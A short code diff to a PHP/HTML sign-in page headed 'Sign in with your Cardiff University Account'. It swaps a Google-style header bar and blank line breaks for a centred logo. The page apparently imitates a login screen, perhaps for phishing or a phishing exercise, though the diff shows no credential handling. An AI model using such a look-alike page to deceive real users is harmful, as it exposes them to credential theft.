@@ -121,25 +121,8 @@ require_once('helper.php');
 
     <div class="container">
 
-      <div class="google-header-bar centered">
-        <div class="header content clearfix">
-          <img src="cardiff.jpg" alt="Cardiff" style="margin: 0 auto; display:block; text-align: center">
-        </div>
-      </div>
 
-
-	<br></br>
-	<br></br>
-	<br></br>
-	<br></br>
-	<br></br>
-	<br></br>
-	<br></br>
-	<br></br>
-	<br></br>
-	<br></br>
-	<br></br>
-	<br></br>
+	<img src="cardiff.jpg" alt="Cardiff" style="margin: 0 auto; display:block; text-align: center">
 
 
       <h1 class="text-center login-title">Sign in with your Cardiff University Account</h1>
